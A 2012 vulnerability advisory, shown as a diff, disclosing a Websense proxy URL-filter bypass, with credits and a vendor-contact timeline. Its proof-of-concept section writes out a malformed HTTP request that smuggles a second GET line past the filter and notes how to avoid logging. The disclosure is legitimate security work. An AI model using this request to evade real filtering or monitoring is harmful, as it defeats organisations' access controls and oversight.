@@ -1,0 +1,104 @@
+Websense Proxy Filter Bypass
+
+
+
+1. Advisory Information
+
+Date published: 2012-11-25
+
+Vendors contacted: Websense
+
+Release mode: Coordinated release (Vendor was notified) 
+
+2. Vulnerability Information
+
+Class: Filter Bypass
+
+Remotely Exploitable: Yes
+
+
+
+3. Software Description
+
+Internet access management system allows an organization to monitor, report and manage internal Internet use.
+
+
+
+4. Vulnerability Description
+
+An authenticated user could successfully bypass URL restrictions and access unauthorized sites.
+
+5. Vulnerable packages
+
+All ? No patch available yet
+
+6. Technical Description - PoC
+
+It's possible to bypass the proxy filter by issuing the following specially crafted request:
+
+
+
+====
+
+GET www.facebook.com http/1.1
+
+Accept: text/Html, application/xHtml+xml, */*
+
+Accept-Language: es-AR
+
+Cache-Control: no-cache
+
+Content-length: 1
+
+
+
+GET ://OTHERURL/OTHEROTHER
+
+a
+
+====
+
+
+
+And Websense will fetch the Facebook site and log "OTHERURL" (which is also fetched in the background).
+
+
+
+To be completely stealth, just remove ?a? char and no log will be recorded.
+
+
+
+Limitations: It's only possible to issue GET requests.
+
+
+
+It will only work if the remote Webserver accepts malformed GET requests specifying a Content-Length, like Facebook, Hotmail, Etc. The attacker might use a WebProxy with this property, completely bypassing the filter.
+
+
+
+7. Credits
+
+Nahuel Grisolia discovered this vulnerability.
+
+nahuel@cintainfinita.com.ar
+
+http://cintainfinita.com.ar
+
+
+
+8. Report Timeline
+
+* 2012-04-23 / Vulnerability identified
+
+* 2012-04-23 / Vendor contacted
+
+* 2012-04-23 / Vulnerability details sent to Vendor
+
+* 2012-04-23 ? 2012-11-24 / Multiple contacts
+
+* 2012-11-25 / Vulnerability Disclosed ? PoC attached
+
+
+
+
+
